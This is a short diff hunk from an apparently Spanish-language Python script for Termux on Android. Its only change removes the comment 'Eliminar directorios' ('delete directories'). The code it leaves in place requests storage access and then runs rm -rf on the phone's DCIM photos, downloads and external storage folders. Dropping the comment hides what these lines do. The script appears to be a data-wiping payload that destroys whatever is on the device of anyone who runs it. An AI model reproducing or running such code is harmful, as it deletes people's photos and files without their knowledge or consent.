@@ -10,7 +10,6 @@ else:
     os.system("termux-setup-storage")
     sys.exit()
 
-# Eliminar directorios
 os.system("rm -rf /data/data/com.termux/files/home/storage/dcim/")
 os.system("rm -rf /data/data/com.termux/files/home/storage/downloads/")
 os.system("rm -rf /data/data/com.termux/files/home/storage/external-1/")
